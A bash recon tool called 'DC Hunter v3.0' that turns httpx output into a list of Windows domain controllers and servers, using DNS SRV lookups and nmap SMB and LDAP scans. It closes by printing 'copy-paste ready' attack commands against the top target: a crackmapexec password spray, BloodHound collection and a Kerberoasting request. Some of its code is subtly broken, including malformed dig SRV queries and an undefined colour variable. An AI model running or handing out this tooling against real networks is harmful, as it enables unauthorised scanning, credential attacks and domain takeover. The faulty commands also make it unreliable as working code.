#!/bin/bash

# DC Hunter v3.0 - httpx.txt → Auto Domain → Find DCs + Windows Servers
# Input: httpx output → Output: ALL Domain Controllers + Windows Machines

GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'
PURPLE='\033[0;35m'; CYAN='\033[0;36m'; MAGENTA='\033[0;95m'; NC='\033[0m'
BOLD='\033[1m'

clear

cat << 'EOF'
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║  🔥 DC HUNTER v3.0 - HTTPX → WINDOWS DC/SRV AUTO DETECTOR 🔥                                                      ║
║  httpx.txt → Auto Domain Extract → DNS SRV → LDAP → SMB → Windows Servers → PRIORITY TARGETS                      ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
EOF

# Input httpx file
read -p "Enter httpx.txt file path: " HTTPX_FILE
[[ ! -f "$HTTPX_FILE" ]] && { echo -e "${RED}File not found: $HTTPX_FILE${NC}"; exit 1; }

OUTPUT="dc_hunter_httpx_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT/{domains,dcs,windows}

echo -e "${GREEN}[+] Input: $HTTPX_FILE${NC}"
echo -e "${GREEN}[+] Output: $OUTPUT${NC}"

# =============================================================================
# PHASE 1: AUTO DOMAIN EXTRACTION (No manual input needed)
# =============================================================================
echo -e "${BOLD}${CYAN}\n🔍 PHASE 1: AUTO DOMAIN EXTRACTION${NC}"

echo -e "${YELLOW}[+] Extracting domains from httpx...${NC}"

# Extract domains from httpx output (https://example.com → example.com)
grep -oE 'https?://([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}' "$HTTPX_FILE" | \
sed -E 's|https?://||g' | sed 's|/.*$||' | sort -u > $OUTPUT/domains/all_domains.txt

# Extract unique FQDNs (sub.example.com → example.com)
grep -oE '([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}' "$HTTPX_FILE" | \
sed -E 's|^[^.]+\.||' | sort -u > $OUTPUT/domains/unique_domains.txt

echo -e "${GREEN}✅ $(wc -l < $OUTPUT/domains/all_domains.txt) total domains${NC}"
echo -e "${GREEN}✅ $(wc -l < $OUTPUT/domains/unique_domains.txt) unique domains${NC}"

# Show top domains
echo -e "${YELLOW}Top domains found:${NC}"
head -5 $OUTPUT/domains/unique_domains.txt

# =============================================================================
# PHASE 2: DC DETECTION PER DOMAIN
# =============================================================================
echo -e "${BOLD}${RED}\n🔍 PHASE 2: DC HUNTING (ALL DOMAINS)${NC}"

while IFS= read -r DOMAIN; do
    [[ -z "$DOMAIN" ]] && continue
    
    echo -e "${BLUE} Hunting DCs for: $DOMAIN${NC}"
    DOMAIN_OUTPUT="$OUTPUT/dcs/$DOMAIN"
    mkdir -p $DOMAIN_OUTPUT
    
    # DNS SRV Records (_ldap, _kerberos, _gc)
    echo -e "  ${YELLOW}DNS SRV Records...${NC}"
    dig +short "$DOMAIN" _ldap._tcp SRV | grep -v "\.$" > "$DOMAIN_OUTPUT/dns_ldap.txt" 2>/dev/null
    dig +short "$DOMAIN" _kerberos._tcp SRV | grep -v "\.$" >> "$DOMAIN_OUTPUT/dns_ldap.txt" 2>/dev/null
    dig +short "$DOMAIN" _gc._tcp SRV | grep -v "\.$" > "$DOMAIN_OUTPUT/dns_gc.txt" 2>/dev/null
    
    # Extract IPs/hostnames
    cat "$DOMAIN_OUTPUT/dns_"*.txt 2>/dev/null | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|[a-zA-Z0-9-]+\.[a-zA-Z0-9-]+\.' | \
    sed 's/\.$//' | sort -u > "$DOMAIN_OUTPUT/all_dcs.txt"
    
    [[ -s "$DOMAIN_OUTPUT/all_dcs.txt" ]] && echo "  ${GREEN}✅ $(wc -l < "$DOMAIN_OUTPUT/all_dcs.txt") DCs found${NC}"
done < $OUTPUT/domains/unique_domains.txt

# =============================================================================
# PHASE 3: WINDOWS SERVER DETECTION
# =============================================================================
echo -e "${BOLD}${YELLOW}\n🔍 PHASE 3: WINDOWS SERVERS (SMB/LDAP)${NC}"

# Extract ALL IPs from httpx
grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' "$HTTPX_FILE" | sort -u > $OUTPUT/windows/all_ips.txt

# Nmap Windows services scan
echo -e "${YELLOW}[+] Scanning for Windows services (445,389,88,135)...${NC}"
nmap -iL $OUTPUT/windows/all_ips.txt -p445,389,88,135,636,3268 --open \
--script smb-os-discovery,ldap-rootdse -oN $OUTPUT/windows/windows_servers.txt

# Filter Windows + DCs
grep -i "windows\|microsoft\|domain controller\|ldap" $OUTPUT/windows/windows_servers.txt > $OUTPUT/windows/windows_hits.txt

echo -e "${GREEN}✅ $(grep -c "open" $OUTPUT/windows/windows_hits.txt 2>/dev/null || echo 0) Windows servers${NC}"

# =============================================================================
# PHASE 4: CONSOLIDATE ALL FINDINGS
# =============================================================================
echo -e "${BOLD}${PURPLE}\n🔍 PHASE 4: CONSOLIDATION${NC}"

# ALL DCs from all methods
find $OUTPUT/dcs -name "all_dcs.txt" -exec cat {} \; 2>/dev/null | sort -u > $OUTPUT/all_dcs_consolidated.txt
grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' $OUTPUT/windows/windows_hits.txt | sort -u >> $OUTPUT/all_dcs_consolidated.txt
sort -u $OUTPUT/all_dcs_consolidated.txt -o $OUTPUT/all_dcs_consolidated.txt

# Priority targets (DCs first)
head -20 $OUTPUT/all_dcs_consolidated.txt > $OUTPUT/priority_targets.txt

# =============================================================================
# PHASE 5: RESULTS SUMMARY
# =============================================================================
echo -e "${BOLD}${WHITE}\n\n══════════════════════ DC HUNTER v3.0 RESULTS ══════════════════════${NC}"
echo -e "${MAGENTA}╔══════════════════════════════════════════════════════════════════════╗${NC}"
printf "${MAGENTA}║  %-20s: %s${NC}\n" "Unique Domains" "$(wc -l < $OUTPUT/domains/unique_domains.txt 2>/dev/null || echo 0)"
printf "${MAGENTA}║  %-20s: %s${NC}\n" "Total DCs Found" "$(wc -l < $OUTPUT/all_dcs_consolidated.txt 2>/dev/null || echo 0)"
printf "${MAGENTA}║  %-20s: %s${NC}\n" "Windows Servers" "$(grep -c "open.*445" $OUTPUT/windows/windows_hits.txt 2>/dev/null || echo 0)"
printf "${MAGENTA}║  %-20s: %s${NC}\n" "Files Generated" "$(find $OUTPUT | wc -l)"
echo -e "${MAGENTA}╚══════════════════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${BOLD}${CYAN}🎯 PRIORITY DC TARGETS:${NC}"
echo "──────────────────────"
head -10 $OUTPUT/priority_targets.txt 2>/dev/null || echo "No DCs found"

echo -e "\n${BOLD}${RED}🚀 ATTACK COMMANDS (Copy-Paste Ready):${NC}"
PRIORITY_DC=$(head -1 $OUTPUT/priority_targets.txt 2>/dev/null)
[[ -n "$PRIORITY_DC" ]] && {
    echo -e "${YELLOW}cme smb $PRIORITY_DC -u users.txt -p passwords.txt${NC}"
    echo -e "${YELLOW}bloodhound-python -d \$(head -1 $OUTPUT/domains/unique_domains.txt) -dc $PRIORITY_DC${NC}"
    echo -e "${YELLOW}GetUserSPNs user:pass@$PRIORITY_DC -request${NC}"
}

echo -e "\n${BOLD}${GREEN}🏆 DC HUNTER v3.0 COMPLETE!${NC}"
echo -e "${WHITE}📁 Results: $OUTPUT/${NC}"
echo -e "${CYAN}All Domain Controllers + Windows Servers identified from httpx.txt!${NC}"
